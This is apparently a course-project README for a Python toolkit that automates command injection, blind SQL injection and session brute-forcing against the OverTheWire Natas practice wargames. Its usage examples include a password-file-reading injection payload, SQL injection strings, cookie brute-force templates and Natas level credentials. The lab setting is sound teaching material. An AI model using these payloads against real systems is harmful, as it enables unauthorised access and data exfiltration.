
# Security Engineering Toolkit: An Automated Vulnerability Prober

## Overview

This project is the primary output of a Security Engineering course project. It began as a deep-dive analysis into the OverTheWire Natas wargames and evolved into the creation of a modular, Python-based security toolkit designed to intelligently automate the discovery and exploitation of common web vulnerabilities.

The core philosophy of this toolkit is to move beyond simple, blind exploitation and implement more intelligent, analysis-driven automation. Each module was directly inspired by a specific challenge encountered during the Natas wargames, translating theoretical knowledge into a practical, reusable tool.

## Features

-   **Intelligent OS Command Injection Prober:** Uses a response-diffing algorithm to precisely detect the output of injected commands, reducing false positives.
-   **Boolean-Based Blind SQLi Exfiltrator:** Automates the character-by-character exfiltration of data when only a "true" or "false" response is available from the server.
-   **Time-Based Blind SQLi Exfiltrator:** Exploits time-based side channels to exfiltrate data from completely "blind" injection points where no visible output is provided.
-   **Session ID Brute-Forcer:** A specialised tool to exploit weak session ID generation, capable of handling both simple numeric and hex-encoded session tokens.

## Prerequisites & Setup

The toolkit is designed to run on Python 3.9+ and requires the `requests` library.

1.  **Clone the repository:**
    ```bash
    git clone [your-repo-link]
    cd [your-repo-directory]
    ```

2.  **Create and activate a virtual environment (recommended):**
    ```bash
    python -m venv venv
    source venv/bin/activate
    ```

3.  **Install the required dependencies:**
    ```bash
    pip install -r requirements.txt
    ```

## Usage

The toolkit is operated from `main.py` with a clear command structure.

### General Help

To see the main commands (`inject`, `session`), use the help flag:
```bash
python main.py -h
```
To see the options for a specific subcommand, like `inject`:
```bash
python main.py inject -h
```

---

### Module 1: OS Command Injection (`cmd`)

This module tests for OS command injection vulnerabilities. It intelligently compares a baseline response with the exploit response to confirm success.

**Example Command (for Natas 9):**
```bash
python main.py inject cmd http://natas9.natas.labs.overthewire.org/ \
    -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" \
    --param needle \
    --payload "; cat /etc/natas_webpass/natas10 #"
```

**Argument Breakdown:**
-   `inject cmd`: Specifies the command injection module.
-   `-u "user:pass"`: Sets the basic authentication credentials.
-   `--param needle`: The name of the vulnerable parameter in the request.
-   `--payload "..."`: The specific malicious payload to inject. The `#` is used to comment out the rest of the original command.

---

### Module 2: Boolean-Based Blind SQL Injection (`sqli-bool`)

This module automates the painstaking process of exfiltrating data when the only feedback is a "success" or "failure" message.

**Manual Analysis (The process the tool automates):**
The tool automates the process of checking each character. For example, to manually check if the password starts with 'a' and then 'h':
```sql
natas16" AND password LIKE BINARY "a%" -- -
natas16" AND password LIKE BINARY "h%" -- -
```

**Example Command (for Natas 15):**
```bash
python main.py inject sqli-bool http://natas15.natas.labs.overthewire.org/ \
    -u "natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" \
    --data "username=natas16" \
    --param-to-fuzz username \
    --success-string "This user exists"
```

**Argument Breakdown:**
-   `inject sqli-bool`: Specifies the boolean-based SQLi module.
-   `--data "username=natas16"`: The POST data to send. The tool will inject into this data.
-   `--param-to-fuzz "username"`: The specific key within the `--data` dictionary to inject into.
-   `--success-string "..."`: **Crucial.** This is the exact text the tool looks for in the response to confirm a "true" condition.

---

### Module 3: Time-Based Blind SQL Injection (`sqli-time`)

This module is for the most difficult scenarios where there is no visible feedback. It infers data based on server response delays.

**Example Command (for Natas 17):**
```bash
python main.py inject sqli-time http://natas17.natas.labs.overthewire.org/ \
    -u "natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC" \
    --data "username=natas18" \
    --param-to-fuzz username \
    --sleep-time 3 \
    --max-len 32
```

**Argument Breakdown:**
-   `inject sqli-time`: Specifies the time-based SQLi module.
-   `--sleep-time 3`: The number of seconds to ask the database to `SLEEP()`. Choose a value high enough to be clearly distinguishable from normal network latency.
-   `--max-len 32`: The maximum password length to test for. The script first determines the exact length before exfiltrating characters.

---

### Module 4: Session ID Brute-Forcer (`session`)

This module exploits predictable session ID generation schemes.

**Example Command - Simple Integers (for Natas 18):**
```bash
python main.py session http://natas18.natas.labs.overthewire.org/ \
    -u "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" \
    --range "1:640:1" \
    --template "PHPSESSID=^PASS^" \
    --success-string "You are an admin"
```

**Example Command - Hex-Encoded (for Natas 19):**
```bash
python main.py session http://natas19.natas.labs.overthewire.org/ \
    -u "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" \
    --range "1:640:1" \
    --template "PHPSESSID=^PASS^" \
    --success-string "You are an admin" \
    --hex-encode
```

**Argument Breakdown:**
-   `session`: Specifies the session brute-force module.
-   `--range "1:640:1"`: The range to test, in `start:stop:step` format.
-   `--template "PHPSESSID=^PASS^"`: The cookie structure. `^PASS^` is the placeholder that will be replaced with the generated ID.
-   `--hex-encode`: An optional flag that enables the specific logic for Natas 19 (encodes `[ID]-admin` to hex).

